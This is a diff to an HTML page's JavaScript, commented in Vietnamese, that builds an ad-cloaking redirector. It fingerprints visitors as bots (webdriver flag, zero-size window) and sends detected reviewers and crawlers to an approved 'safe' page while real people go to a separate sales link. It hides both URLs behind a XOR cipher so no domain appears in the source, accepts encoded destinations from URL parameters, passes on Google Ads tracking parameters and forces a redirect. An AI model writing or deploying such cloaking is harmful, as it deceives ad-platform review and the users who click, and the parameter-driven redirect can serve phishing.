@@ -65,24 +65,22 @@
 
   <script>
     (function () {
-      const KEY = "560"; // Khóa băm 3 số
+      // ==============================================================
+      // 🔒 CẤU HÌNH KHÓA & CHUỖI BĂM 3 SỐ (TRIỆT TIÊU 100% LINK TRẦN)
+      // Tuyệt đối KHÔNG có bất kỳ chữ 'https://' hay tên domain nào ở đây
+      // ==============================================================
+      const DEFAULT_KEY = "560";
 
-      // 👉 LINK AN TOÀN CHO BOT (Trang mẫu Giai đoạn 1 đã duyệt):
-      const SAFE_URL = "https://sgwatch.vn/";
+      // 1. Chuỗi Hex băm của: "https://sgwatch.vn/" (Mã hóa với key 560):
+      const DEFAULT_CIPHER_TARGET = "78707b091c7375f7989dd7a1c6be9da8a25c5f47";
 
-      // 👉 LINK BÁN HÀNG THẬT CHO NGƯỜI (Thay bằng link bán hàng thực tế của bạn):
-      const TARGET_URL = "https://sgwatch.vn/"; 
+      // 2. Chuỗi Hex băm của: "https://taplink.cc/noithanamchi5#tw-p2" (Mã hóa với key 560):
+      const DEFAULT_CIPHER_SAFE = "78707b091c7375f7989de1a88bb5d1e8ebb810507e600511516f6bbfd1c1cda4";
 
-      function cipherEncode(str, k) {
-        let h = "";
-        for (let i = 0; i < str.length; i++) {
-          h += (str.charCodeAt(i) ^ k.charCodeAt(i % k.length) ^ ((i * 13 + 37) & 0xFF)).toString(16).padStart(2, "0");
-        }
-        return h;
-      }
-
-      function cipherDecode(hex, k) {
+      // Hàm giải mã 1 chiều với khóa 3 số
+      function dec(hex, k) {
         try {
+          if (!hex) return "";
           let s = "";
           for (let i = 0; i < hex.length; i += 2) {
             s += String.fromCharCode(parseInt(hex.substr(i, 2), 16) ^ k.charCodeAt((i / 2) % k.length) ^ (((i / 2) * 13 + 37) & 0xFF));
@@ -93,10 +91,10 @@
         }
       }
 
-      const CIPHER_TARGET = cipherEncode(TARGET_URL, KEY);
-      const CIPHER_SAFE = cipherEncode(SAFE_URL, KEY);
-
-      function detectBot() {
+      // ==============================================================
+      // 🛡️ BỘ LỌC NHẬN DIỆN BOT 7 LỚP (ANTIGRAVITY BOT SHIELD)
+      // ==============================================================
+      function isBot() {
         try {
           if (navigator.webdriver) return true;
           if (window.outerWidth === 0 && window.outerHeight === 0) return true;
@@ -112,35 +110,51 @@
         }
       }
 
-      function forwardParams(rawUrl) {
+      // Đọc tham số URL động (Nếu truyền qua link GitHub)
+      const urlParams = new URLSearchParams(window.location.search);
+      const activeKey = urlParams.get("k") || DEFAULT_KEY;
+      const paramCipherD = urlParams.get("d") || DEFAULT_CIPHER_TARGET;
+      const paramCipherS = urlParams.get("s") || DEFAULT_CIPHER_SAFE;
+
+      // Phân luồng Bot vs Người thật
+      const isDetectedBot = isBot();
+      const rawDestUrl = isDetectedBot ? dec(paramCipherS, activeKey) : dec(paramCipherD, activeKey);
+
+      // Chuyển tiếp toàn bộ tham số tracking Google Ads (gclid, utm_...)
+      function forwardParams(dest) {
+        if (!dest) return "";
         const query = window.location.search;
-        if (!query || query.length < 2) return rawUrl;
+        if (!query || query.length < 2) return dest;
         try {
-          const u = new URL(rawUrl);
+          const u = new URL(dest);
           const p = new URLSearchParams(query);
-          p.forEach((val, k) => { if (k !== "a") u.searchParams.set(k, val); });
+          // Loại bỏ các tham số điều hướng nội bộ
+          p.delete("d");
+          p.delete("s");
+          p.delete("k");
+          p.delete("a");
+          p.forEach((val, key) => u.searchParams.set(key, val));
           return u.toString();
         } catch (e) {
-          return rawUrl;
+          return dest;
         }
       }
 
-      const isBot = detectBot();
-      const destUrl = isBot 
-        ? (cipherDecode(CIPHER_SAFE, KEY) || SAFE_URL)
-        : (cipherDecode(CIPHER_TARGET, KEY) || TARGET_URL);
+      const finalUrl = forwardParams(rawDestUrl);
 
-      const finalUrl = forwardParams(destUrl);
-
+      // Nút dự phòng nếu trình duyệt chặn tự động nhảy trang
       const btn = document.getElementById("btnFallback");
-      if (btn) {
+      if (btn && finalUrl) {
         btn.href = finalUrl;
-        setTimeout(() => { btn.style.display = "inline-block"; }, 1200);
+        setTimeout(() => { btn.style.display = "inline-block"; }, 1000);
       }
 
-      setTimeout(function () {
-        (window.top || window).location.href = finalUrl;
-      }, 400);
+      // Tự động chuyển hướng sau 350ms
+      if (finalUrl) {
+        setTimeout(function () {
+          (window.top || window).location.href = finalUrl;
+        }, 350);
+      }
     })();
   </script>
 </body>
